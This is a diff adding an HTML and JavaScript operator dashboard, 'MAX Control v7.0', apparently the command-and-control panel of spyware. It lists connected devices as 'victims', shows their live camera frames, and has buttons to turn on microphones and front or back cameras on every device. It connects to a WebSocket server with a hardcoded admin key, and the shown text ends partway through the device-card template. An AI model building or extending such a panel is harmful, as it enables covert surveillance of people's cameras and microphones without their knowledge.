@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MAX Control Panel — фиолетовая</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a0b2e 0%, #2d1b3a 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #fff;
+        }
+
+        /* Фиолетовый хедер */
+        .header {
+            background: linear-gradient(135deg, #6a0dad 0%, #4b0082 100%);
+            border: 2px solid #d4a5ff;
+            border-radius: 30px;
+            padding: 25px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 0 40px rgba(138, 43, 226, 0.5);
+        }
+
+        .header-title {
+            font-size: 36px;
+            font-weight: bold;
+            text-shadow: 0 0 20px #ffa5ff;
+            color: white;
+        }
+
+        .header-stats {
+            text-align: right;
+        }
+
+        .victim-count {
+            font-size: 52px;
+            font-weight: bold;
+            color: #ffa5ff;
+            line-height: 1;
+            text-shadow: 0 0 20px #ff69b4;
+        }
+
+        .stats-label {
+            font-size: 14px;
+            color: #e6b3ff;
+        }
+
+        .connection-status {
+            display: inline-block;
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .status-connected {
+            background: #aa4cff;
+            box-shadow: 0 0 20px #b87aff;
+        }
+
+        .status-disconnected {
+            background: #ff4444;
+            box-shadow: 0 0 20px #ff6b6b;
+        }
+
+        /* Панель управления */
+        .control-panel {
+            background: linear-gradient(135deg, #4b0082 0%, #2e0854 100%);
+            border: 2px solid #b87aff;
+            border-radius: 30px;
+            padding: 20px;
+            margin-bottom: 25px;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            box-shadow: 0 10px 30px rgba(106, 13, 173, 0.5);
+        }
+
+        .control-btn {
+            background: transparent;
+            border: 2px solid #d4a5ff;
+            color: #f0e6ff;
+            padding: 12px 25px;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .control-btn:hover {
+            background: #b87aff;
+            color: #000;
+            box-shadow: 0 0 30px #b87aff;
+            border-color: #ffa5ff;
+        }
+
+        .control-btn.danger {
+            border-color: #ff6b6b;
+            color: #ffb3b3;
+        }
+
+        .control-btn.danger:hover {
+            background: #ff4444;
+            color: white;
+            box-shadow: 0 0 30px #ff4444;
+        }
+
+        .control-btn.purple {
+            background: #9932cc;
+            color: white;
+            border-color: #e6b3ff;
+        }
+
+        /* Сетка жертв */
+        .victims-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+            gap: 25px;
+            margin-bottom: 25px;
+        }
+
+        .victim-card {
+            background: linear-gradient(135deg, #3a1b4a 0%, #2a0f3a 100%);
+            border: 2px solid #b87aff;
+            border-radius: 30px;
+            overflow: hidden;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(138, 43, 226, 0.3);
+        }
+
+        .victim-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 50px rgba(186, 85, 211, 0.6);
+            border-color: #ffa5ff;
+        }
+
+        .victim-header {
+            background: rgba(75, 0, 130, 0.7);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #b87aff;
+        }
+
+        .victim-id {
+            font-size: 16px;
+            font-weight: bold;
+            color: #ffa5ff;
+        }
+
+        .victim-time {
+            font-size: 14px;
+            color: #d4a5ff;
+        }
+
+        .status-badge {
+            padding: 6px 12px;
+            border-radius: 30px;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .status-badge.active {
+            background: #aa4cff;
+            color: white;
+            box-shadow: 0 0 15px #b87aff;
+        }
+
+        .status-badge.background {
+            background: #ff9900;
+            color: #000;
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            background: #000;
+            aspect-ratio: 4/3;
+            cursor: pointer;
+            border-bottom: 2px solid #b87aff;
+        }
+
+        .video-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .video-overlay {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(106, 13, 173, 0.9);
+            color: #ffa5ff;
+            padding: 8px 15px;
+            border-radius: 30px;
+            font-size: 14px;
+            border: 2px solid #e6b3ff;
+            backdrop-filter: blur(5px);
+        }
+
+        .video-info {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: rgba(75, 0, 130, 0.9);
+            color: #ffa5ff;
+            padding: 8px 15px;
+            border-radius: 30px;
+            font-size: 12px;
+            border: 1px solid #e6b3ff;
+        }
+
+        /* Панель управления жертвой */
+        .victim-footer {
+            padding: 15px 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            background: rgba(46, 7, 63, 0.5);
+        }
+
+        .victim-btn {
+            flex: 1;
+            min-width: 80px;
+            background: transparent;
+            border: 2px solid #b87aff;
+            color: #f0e6ff;
+            padding: 10px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+
+        .victim-btn:hover {
+            background: #b87aff;
+            color: #000;
+            box-shadow: 0 0 20px #b87aff;
+        }
+
+        .victim-btn.audio:hover {
+            background: #44aaff;
+            border-color: #aad4ff;
+        }
+
+        .victim-btn.video:hover {
+            background: #aa4cff;
+        }
+
+        .victim-btn.remote:hover {
+            background: #ff44aa;
+            border-color: #ffaad4;
+        }
+
+        /* Лог панель */
+        .log-panel {
+            background: linear-gradient(135deg, #4b0082 0%, #2e0854 100%);
+            border: 2px solid #b87aff;
+            border-radius: 30px;
+            padding: 20px;
+            margin-top: 25px;
+        }
+
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #b87aff;
+        }
+
+        .log-title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #ffa5ff;
+        }
+
+        .log-clear {
+            background: transparent;
+            border: 2px solid #ff6b6b;
+            color: #ffb3b3;
+            padding: 8px 20px;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .log-clear:hover {
+            background: #ff4444;
+            color: white;
+        }
+
+        .log-container {
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 14px;
+        }
+
+        .log-entry {
+            padding: 8px 0;
+            border-bottom: 1px solid #6a0dad;
+            color: #e6b3ff;
+            word-break: break-all;
+        }
+
+        .log-time {
+            color: #b87aff;
+            margin-right: 15px;
+        }
+
+        /* Модальное окно */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(46, 7, 63, 0.95);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(15px);
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #6a0dad 0%, #4b0082 100%);
+            border: 3px solid #ffa5ff;
+            border-radius: 50px;
+            padding: 30px;
+            max-width: 90%;
+            max-height: 90%;
+            position: relative;
+            box-shadow: 0 0 60px #b87aff;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: -15px;
+            right: -15px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #ff4444;
+            color: white;
+            border: 2px solid white;
+            cursor: pointer;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-image {
+            max-width: 100%;
+            max-height: 70vh;
+            border: 2px solid #b87aff;
+            border-radius: 30px;
+        }
+
+        /* Fullscreen кнопка */
+        .fullscreen-btn {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #b87aff 0%, #aa4cff 100%);
+            border: 3px solid white;
+            color: white;
+            font-size: 30px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 40px #b87aff;
+            z-index: 9999;
+            transition: all 0.3s;
+        }
+
+        .fullscreen-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 60px #ffa5ff;
+        }
+
+        /* Аудио индикатор */
+        .audio-wave {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background: #44aaff;
+            border-radius: 50%;
+            margin-left: 5px;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.5; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.2); background: #ff44aa; }
+            100% { opacity: 0.5; transform: scale(1); }
+        }
+
+        /* Скроллбар фиолетовый */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #2e0854;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #b87aff;
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #ffa5ff;
+        }
+    </style>
+</head>
+<body>
+    <!-- Хедер -->
+    <div class="header">
+        <div>
+            <div class="header-title">🎥 MAX CONTROL v7.0</div>
+            <div style="color: #e6b3ff; font-size: 14px; margin-top: 8px; display: flex; align-items: center;">
+                <span class="connection-status" id="connectionStatus"></span>
+                <span id="connectionText">Отключено</span>
+                <span style="margin-left: 20px;" id="serverTime"></span>
+            </div>
+        </div>
+        <div class="header-stats">
+            <div class="victim-count" id="victimCount">0</div>
+            <div class="stats-label">УСТРОЙСТВ ONLINE</div>
+        </div>
+    </div>
+
+    <!-- Панель управления -->
+    <div class="control-panel">
+        <button class="control-btn" onclick="connectToServer()" id="connectBtn">🔌 ПОДКЛЮЧИТЬСЯ</button>
+        <button class="control-btn danger" onclick="disconnectFromServer()" id="disconnectBtn" style="display: none;">❌ ОТКЛЮЧИТЬСЯ</button>
+        <button class="control-btn" onclick="clearAllVictims()">🗑️ ОЧИСТИТЬ ВСЕ</button>
+        <button class="control-btn" onclick="broadcastAudio()">🎤 АУДИО ВСЕМ</button>
+        <button class="control-btn" onclick="broadcastVideo('front')">📱 ФРОНТАЛЬНАЯ ВСЕМ</button>
+        <button class="control-btn" onclick="broadcastVideo('back')">📷 ОСНОВНАЯ ВСЕМ</button>
+        <button class="control-btn purple" onclick="showSettings()">⚙️ НАСТРОЙКИ</button>
+    </div>
+
+    <!-- Сетка устройств -->
+    <div class="victims-grid" id="victimsGrid"></div>
+
+    <!-- Лог панель -->
+    <div class="log-panel">
+        <div class="log-header">
+            <div class="log-title">📋 SYSTEM LOG</div>
+            <button class="log-clear" onclick="clearLog()">ОЧИСТИТЬ</button>
+        </div>
+        <div class="log-container" id="logContainer">
+            <div class="log-entry">
+                <span class="log-time">[12:00:00]</span> MAX Control v7.0 инициализирована
+            </div>
+        </div>
+    </div>
+
+    <!-- Кнопка полного экрана -->
+    <button class="fullscreen-btn" onclick="toggleFullscreen()">⛶</button>
+
+    <!-- Модальное окно для просмотра -->
+    <div class="modal" id="viewModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeModal()">×</button>
+            <img class="modal-image" id="modalImage" src="" alt="">
+            <div style="text-align: center; margin-top: 15px; color: #ffa5ff;" id="modalInfo"></div>
+        </div>
+    </div>
+
+    <script>
+        // ========== КОНФИГУРАЦИЯ ==========
+        let ws = null;
+        let devices = new Map(); // устройства (жертвы)
+        let admins = new Set();
+        let isConnected = false;
+        
+        const SERVER_URL = 'ws://localhost:8080/max-control';
+        const ADMIN_KEY = 'admin123';
+
+        // DOM элементы
+        const victimsGrid = document.getElementById('victimsGrid');
+        const logContainer = document.getElementById('logContainer');
+        const victimCountSpan = document.getElementById('victimCount');
+        const connectionStatus = document.getElementById('connectionStatus');
+        const connectionText = document.getElementById('connectionText');
+        const connectBtn = document.getElementById('connectBtn');
+        const disconnectBtn = document.getElementById('disconnectBtn');
+        const serverTimeSpan = document.getElementById('serverTime');
+
+        // ========== ВРЕМЯ ==========
+        function updateServerTime() {
+            const now = new Date();
+            serverTimeSpan.innerText = `🕐 ${now.toLocaleTimeString()}`;
+        }
+        setInterval(updateServerTime, 1000);
+
+        // ========== ПОДКЛЮЧЕНИЕ ==========
+        function connectToServer() {
+            try {
+                addLog('🔌 Подключение к MAX серверу...');
+                
+                ws = new WebSocket(SERVER_URL);
+                
+                ws.onopen = function() {
+                    isConnected = true;
+                    updateConnectionStatus(true);
+                    addLog('✅ Подключено к серверу');
+                    
+                    connectBtn.style.display = 'none';
+                    disconnectBtn.style.display = 'block';
+                    
+                    // Аутентификация
+                    ws.send(JSON.stringify({
+                        type: 'admin_connect',
+                        key: ADMIN_KEY,
+                        version: '7.0'
+                    }));
+                };
+                
+                ws.onclose = function() {
+                    isConnected = false;
+                    updateConnectionStatus(false);
+                    addLog('❌ Отключено от сервера');
+                    
+                    connectBtn.style.display = 'block';
+                    disconnectBtn.style.display = 'none';
+                };
+                
+                ws.onmessage = function(event) {
+                    try {
+                        const data = JSON.parse(event.data);
+                        handleServerMessage(data);
+                    } catch(e) {
+                        addLog('⚠️ Ошибка парсинга: ' + e.message);
+                    }
+                };
+                
+            } catch(e) {
+                addLog('⚠️ Ошибка подключения: ' + e.message);
+            }
+        }
+
+        function disconnectFromServer() {
+            if (ws) {
+                ws.close();
+                ws = null;
+            }
+        }
+
+        function updateConnectionStatus(connected) {
+            if (connected) {
+                connectionStatus.className = 'connection-status status-connected';
+                connectionText.innerText = 'Подключено';
+            } else {
+                connectionStatus.className = 'connection-status status-disconnected';
+                connectionText.innerText = 'Отключено';
+            }
+        }
+
+        // ========== ОБРАБОТКА СООБЩЕНИЙ ==========
+        function handleServerMessage(data) {
+            switch(data.type) {
+                case 'devices_list':
+                    if (data.devices) {
+                        data.devices.forEach(device => addDevice(device));
+                        addLog(`📋 Получен список: ${data.devices.length} устройств`);
+                    }
+                    break;
+                    
+                case 'new_device':
+                    addDevice(data);
+                    addLog(`🆕 Новое устройство: ${data.deviceId.substring(0,8)}... ${data.features ? '📱' : '💻'}`);
+                    break;
+                    
+                case 'frame':
+                    updateFrame(data.deviceId, data);
+                    break;
+                    
+                case 'audio_data':
+                    handleAudioData(data);
+                    break;
+                    
+                case 'device_status':
+                    updateDeviceStatus(data.deviceId, data.status);
+                    addLog(`📊 Статус ${data.deviceId.substring(0,8)}...: ${data.status}`);
+                    break;
+                    
+                case 'device_left':
+                    removeDevice(data.deviceId);
+                    addLog(`👋 Устройство отключилось: ${data.deviceId.substring(0,8)}...`);
+                    break;
+                    
+                case 'command_response':
+                    addLog(`📨 Ответ: ${data.message}`);
+                    break;
+            }
+        }
+
+        // ========== УПРАВЛЕНИЕ УСТРОЙСТВАМИ ==========
+        function addDevice(deviceInfo) {
+            const id = deviceInfo.deviceId || deviceInfo;
+            if (devices.has(id)) return;
+            
+            const card = document.createElement('div');
+            card.className = 'victim-card';
+            card.id = `device_${id}`;
+            
+            const time = new Date().toLocaleTimeString();
+            
+            card.innerHTML = `
+                <div class="victim-header">
+                    <span class="victim-id">${id.substring(0,8)}</span>
+                    <span class="victim-time" id="time_${id}">${time}</span>
+                    <span class="status-badge active" id="status_${id}">ONLINE</span>
+                </div>
+                <div class="video-container" onclick="openModal('${id}')">
